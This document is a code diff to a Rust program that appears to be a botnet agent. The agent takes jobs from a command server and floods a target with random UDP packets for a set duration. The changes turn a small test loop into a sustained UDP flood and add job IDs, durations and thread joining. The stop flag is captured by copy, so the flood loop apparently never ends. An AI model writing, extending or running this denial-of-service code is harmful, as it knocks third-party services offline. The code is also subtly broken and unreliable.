@@ -1,4 +1,5 @@
-use std::thread;
+use std::{any::Any, thread::{self, sleep}, time::Duration};
+use rand::RngCore;
 use socket2::{Domain, SockAddr, Socket, Type};
 use reqwest::blocking::Client;
 use serde::{Serialize, Deserialize};
@@ -6,7 +7,7 @@ use serde::{Serialize, Deserialize};
 // const USER_AGENT: &str = env!("USER_AGENT");
 const USER_AGENT: &str = "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00";
 
-// https://localhost:8000
+// http://localhost:8000
 //  - reg    (post)
 //  - target (get)
 
@@ -19,13 +20,15 @@ pub struct AgentInfo {
 #[derive(Deserialize)]
 enum AttackMethod { 
     HTTP,
-    UDP
+    UDPFLOOD
 }
 
 #[derive(Deserialize)]
 struct Job {
+    uuid: String,
     target: String,
     method: AttackMethod,
+    duration: Duration,
     agents: isize,
 }
 
@@ -52,6 +55,12 @@ impl<T: Send + 'static> ThreadPool<T> {
         self.threads.remove(index)
     }
 
+    /// Join a thread and remove it from threadpool
+    fn join(&mut self, index: usize) -> Result<T, Box<dyn Any + Send>> {
+        let t = self.remove(index);
+        t.join()
+    }
+
     /// Join all threads
     fn join_all(self) -> Result<Vec<T>, ()> {
         let mut vector_generics = Vec::new();
@@ -63,6 +72,14 @@ impl<T: Send + 'static> ThreadPool<T> {
         Ok(vector_generics)
     }
 
+}
+
+fn random_bytes(len: usize) -> Vec<u8> {
+    let mut rbytes = Vec::new();
+    rbytes.resize(len, 0);
+    rand::thread_rng().fill_bytes(&mut rbytes);
+    
+    rbytes
 }
 
 fn main() {
@@ -99,19 +116,25 @@ fn main() {
                 Err(_) => break
             };
 
-            // TEST: simple UDP flood implemented
             for target in targets {
                 let target_sockaddr = SockAddr::from(target.target.parse::<std::net::SocketAddr>().unwrap());
                 match target.method {
                     AttackMethod::HTTP => (),
-                    AttackMethod::UDP => {
-                        threadpool.add(move ||{
+                    AttackMethod::UDPFLOOD => {
+                        let mut _stop = false;
+
+                        let thread_id = threadpool.add(move || {
                             let socket = Socket::new(Domain::IPV4, Type::DGRAM, None).unwrap();
                             socket.connect(&target_sockaddr).unwrap();
-                            for _ in 0..100 {
-                                socket.send_to("123".as_bytes(), &target_sockaddr).unwrap();
+
+                            while !_stop {
+                                socket.send_to(&random_bytes(1024), &target_sockaddr).unwrap();
                             }
                         });
+
+                        sleep(target.duration);
+                        _stop = true;
+                        threadpool.join(thread_id).unwrap();
                     }
                 }
             }
